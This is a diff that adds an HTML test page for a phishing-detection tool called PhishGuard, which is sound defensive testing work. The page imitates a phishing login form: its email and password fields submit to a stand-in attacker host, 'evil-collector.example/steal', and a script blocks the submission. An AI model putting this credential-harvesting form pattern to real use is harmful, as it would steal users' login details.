@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Account Verification - Secure Login</title>
+  </head>
+  <body>
+    <!--
+      SAFE TEST PAGE — FOR PHISHGUARD DEVELOPMENT ONLY.
+
+      This page deliberately mimics the STRUCTURE of a phishing login page
+      (a password field whose form submits to a DIFFERENT host) so we can
+      verify PhishGuard's DOM detection.
+
+      It is completely harmless: the form submission is blocked by
+      JavaScript, so NO data is ever sent anywhere. Never use a real
+      phishing site to test a security tool.
+    -->
+    <h1>Sign in to your account</h1>
+
+    <!-- The action points to a different host than where this file runs,
+         which should trigger FORM_ACTION_MISMATCH when a password exists. -->
+    <form
+      id="login-form"
+      action="https://evil-collector.example/steal"
+      method="post"
+    >
+      <label>
+        Email
+        <input type="email" name="email" autocomplete="off" />
+      </label>
+      <label>
+        Password
+        <input type="password" name="password" autocomplete="off" />
+      </label>
+      <button type="submit">Sign in</button>
+    </form>
+
+    <script>
+      // Safety: block the form so nothing is ever actually submitted.
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", (event) => {
+          event.preventDefault();
+          alert("Submission blocked — this is a safe PhishGuard test page.");
+        });
+    </script>
+  </body>
+</html>
